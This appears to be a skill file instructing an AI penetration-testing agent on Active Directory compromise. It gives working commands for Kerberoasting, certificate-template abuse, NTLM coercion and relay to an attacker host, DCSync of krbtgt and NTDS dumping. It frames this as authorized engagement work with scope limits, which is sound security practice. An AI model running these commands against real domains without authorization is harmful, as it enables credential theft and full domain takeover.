---
name: active-directory-overview
description: Active Directory / Kerberos domain compromise: enumeration through BloodHound,
  roasting, delegation abuse, AD CS (ESC1-17), NTLM coercion+relay, DACL abuse,
  and DCSync/ticket forging. Use when you have network reachability to a domain
  controller and either valid domain creds or a pre-auth foothold. Do not use for
  a single Windows host with no domain context — see privesc instead.
phases: [active-directory, credential-access, lateral-movement]
tags: [ad, kerberos, ldap, ntlm, adcs]
mitre: [T1558.003, T1558.004, T1003.006, T1550.003, T1187, T1207, T1649, T1078.002]
requires_tools: [impacket-GetUserSPNs, impacket-GetNPUsers, impacket-secretsdump, impacket-ntlmrelayx, netexec, certipy-ad, bloodhound-ce-python, coercer, bloodyad, kerbrute, ldapdomaindump]
---

<!-- Adapted from strix/skills/technologies/active_directory.md (Apache-2.0) —
     restructured for this platform's phase/tool/blast_radius conventions;
     cross-checked against anthropic/skills' AD-specific entries (Apache-2.0).
     See THIRD_PARTY_NOTICES.md. -->

# Active Directory

AD compromise usually comes from misconfiguration, not memory-corruption bugs: a roastable
service account, a delegation flag, a vulnerable certificate template, or an over-permissive ACL
turns one low-priv domain user into Domain Admin. Almost every path ends at DCSync or a forged
ticket. Test the identity layer — Kerberos, LDAP, NTLM, SMB, AD CS — not the perimeter.

None of the tools below have a dedicated MCP wrapper — run them via `platform_shell` once
installed (see `requires_tools`; cross-check `docs/ARSENAL_TOOLING.md` for install status).

## Attack surface

- **Core services (per DC):** Kerberos 88/tcp+udp, LDAP/LDAPS 389/636, Global Catalog 3268/3269,
  SMB 445, RPC endpoint mapper 135 (+high dynamic ports), NetBIOS 137-139, DNS 53 (AD-integrated,
  check dynamic updates), WinRM 5985/5986, RDP 3389. AD CS adds the CA + web enrollment
  (`/certsrv`, `/ADPolicyProvider_CEP_*`).
- **Principals/objects:** users, computers (`$` accounts), gMSA/sMSA, groups, GPOs, OUs, trusts;
  `servicePrincipalName`, `userAccountControl` flags, `msDS-AllowedToDelegateTo`,
  `msDS-AllowedToActOnBehalfOfOtherIdentity`, `msDS-KeyCredentialLink`; DACLs (GenericAll/
  GenericWrite/WriteDacl/WriteOwner/AddSelf).
- **Trust boundaries:** intra-forest, inter-forest, external, SID history;
  `MachineAccountQuota` (default 10 → any user can join computer accounts — check this early,
  it gates RBCD).

## Recon → BloodHound first

Anonymous/pre-auth: `nmap -Pn -p389 --script ldap-rootdse <DC>`, `enum4linux-ng -A <DC>`,
`kerbrute userenum -d <DOMAIN> --dc <DC> users.txt` (username-less user enum via Kerberos
pre-auth). With any valid creds: `netexec ldap <DC> -u <USER> -p <PASS>` confirms creds + domain
info; `netexec smb <SUBNET> -u <USER> -p <PASS> --shares` finds readable/writable shares.

**BloodHound is the single most valuable step, run it before anything manual:**
```
bloodhound-ce-python -d <DOMAIN> -u <USER> -p <PASS> -c All -ns <DC_IP> --zip
```
Import into BloodHound CE, run "Shortest paths to Domain Admins" / "Owned principals" before
touching anything else — this is `blast_radius="poc"` (pure enumeration), no gate concerns.
Record the graph as evidence via `platform_record_finding`; every subsequent step should trace
back to a specific BloodHound edge, not a guess.

## Key vulnerability classes

**Kerberoasting (T1558.003)** — any authenticated user can request a TGS for any SPN-bearing
account and crack it offline; human-set service-account passwords are the target, machine
accounts are usually uncrackable (false positive — don't report a roastable computer account).
```
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS> -outputfile kerb.txt
hashcat -m 13100 kerb.txt wordlist.txt
```
**AS-REP roasting (T1558.004)** — `DONT_REQ_PREAUTH` accounts yield a crackable blob with *no*
creds, only a known username:
```
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
hashcat -m 18200 asrep.txt wordlist.txt
```

**Delegation abuse** — Unconstrained (`TRUSTED_FOR_DELEGATION`): compromise the host, coerce a
DC/DA to auth to it, capture the TGT from LSA, straight to DCSync. Constrained
(`msDS-AllowedToDelegateTo`): S4U2Self+S4U2Proxy to impersonate any user to the listed SPN. RBCD
(needs write access over a computer object + `MachineAccountQuota>0`): create a fake computer,
set RBCD, S4U to an admin ticket for that host.

**AD CS (ESC1-17)** — the highest-yield modern path; one misconfigured template promotes a
low-priv user to DA and survives password resets. Enumerate first:
```
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -stdout
```
ESC1 (enrollee-supplied SAN + client-auth EKU): `certipy req ... -template <T> -upn
administrator@<DOMAIN>` then `certipy auth -pfx administrator.pfx` → NT hash/TGT. ESC8 (NTLM
relay to `/certsrv`): coerce a DC, relay to the CA web-enrollment endpoint → DC certificate →
DCSync. `certipy find -vulnerable` flags every other ESC variant (ESC4 writable template DACL,
ESC6 `EDITF_ATTRIBUTESUBJECTALTNAME2`, ESC9/10 weak cert mapping, ESC11 RPC relay, ESC13
issuance-policy→group) — confirm enrollment rights actually include your principal before
reporting one (a common false positive).

**NTLM coercion + relay** — force a privileged machine to authenticate to you, relay to a
service without signing/EPA (LDAP, AD CS, SMB):
```
ntlmrelayx.py -t ldap://<DC> --delegate-access --no-dump
coercer coerce -u <USER> -p <PASS> -t <TARGET> -l <ATTACKER_IP>   # or PetitPotam.py (MS-EFSR)
```
Fails silently and safely if the target enforces signing/EPA — that's a negative result, not
a blocked attempt.

**DACL/object abuse** (from BloodHound edges) — GenericAll/GenericWrite on a user → targeted
Kerberoast or **Shadow Credentials** (`certipy shadow auto ... -account <TARGET>` → PKINIT → NT
hash; prefer this over a password reset — reversible, no lockout, no plaintext). WriteDacl/
WriteOwner → grant yourself GenericAll then DCSync rights. AddMember on a privileged group →
self-add.

**Credential access / domain dominance** — DCSync (with `DS-Replication-Get-Changes*` rights)
dumps any hash including `krbtgt`:
```
secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC> -just-dc-user krbtgt
```
Golden ticket (`krbtgt` hash) / Silver ticket (service-account hash) forge TGTs/STs for
persistence — treat this as **destructive-tier by operator judgment**: run via `platform_shell`,
which has no `blast_radius`/ROE gate of its own (see `shared/governance-rules`), so the
authorization check is on you before you run it, not a 403 that will catch a bad call. Do not
persist beyond what the engagement scope explicitly authorizes.

**Known unauthenticated CVEs** (patch-dependent, confirm version first — these are destructive):
ZeroLogon (CVE-2020-1472, resets DC machine account to null → instant DA), noPac
(CVE-2021-42278/42287, sAMAccountName spoofing → impersonate DC).

## Lateral movement once you have a credential/hash

`netexec` is the swiss-army tool — validate creds across a subnet, spray safely against lockout
thresholds, enumerate shares/users/policy, dump SAM/LSA/NTDS, execute commands:
```
netexec smb <SUBNET> -u <USER> -p <PASS>                 # (Pwn3d!) marks local-admin hosts
netexec smb <DC> -u <USER> -p <PASS> --ntds               # full NTDS.dit, needs DA-equivalent
```
Pass-the-hash / overpass-the-hash / pass-the-ticket reuse an NT hash or Kerberos ticket without
the plaintext — same `netexec`/impacket primitives, swap `-p <PASS>` for `-H <NTHASH>`.

## Testing methodology

1. **Foothold check** — confirm creds work (`netexec ldap/smb`), note privileges,
   `MachineAccountQuota`, password policy.
2. **BloodHound** — collect + graph before manual work; mark the foothold principal owned.
3. **Low-noise credential harvest** — AS-REP roast (no auth needed), Kerberoast, readable
   LAPS/gMSA, GPP passwords in SYSVOL.
4. **AD CS sweep** — `certipy find -vulnerable`; often the shortest path, independent of the
   BloodHound graph.
5. **DACL edges** — walk each BloodHound edge from owned → high-value; prefer Shadow Credentials
   over password resets.
6. **Delegation** — enumerate unconstrained/constrained/RBCD; chain with coercion where a
   privileged auth is needed.
7. **Prove domain dominance, then stop** — DCSync `krbtgt` or a target user is sufficient proof;
   don't chain into persistence (golden ticket) without explicit authorization.

## Evidence and impact

Record every step's raw tool output as evidence (`platform_record_finding`), and let
`platform_evidence_chain` walk owned-principal → edge/misconfig → escalation step → resulting
access — that chain, not just the final DA session, is the deliverable. Tie impact to a concrete
identity ("`svc-sql` → Domain Admins via Kerberoasting + unconstrained delegation"), not a
generic "AD is misconfigured."

## Do not

- Report a Kerberoastable **machine account** (120-char random password, uncrackable) as a
  finding — human service accounts are the real signal.
- Claim an ESC-vulnerable template without checking enrollment rights actually include your
  principal — `certipy find` lists the template's flags, not whether you can use it.
- Treat DCSync/ticket-forging/password-reset as casually as recon/BloodHound/AD CS enumeration —
  the latter are pure observation; the former change target state and get no system-enforced
  gate on the `platform_shell` path (see `shared/governance-rules`), so the judgment is yours.
- Persist (golden ticket, added ACEs, backdoor accounts) beyond what the engagement scope
  authorizes — proving domain dominance once is the goal, not maintaining it.
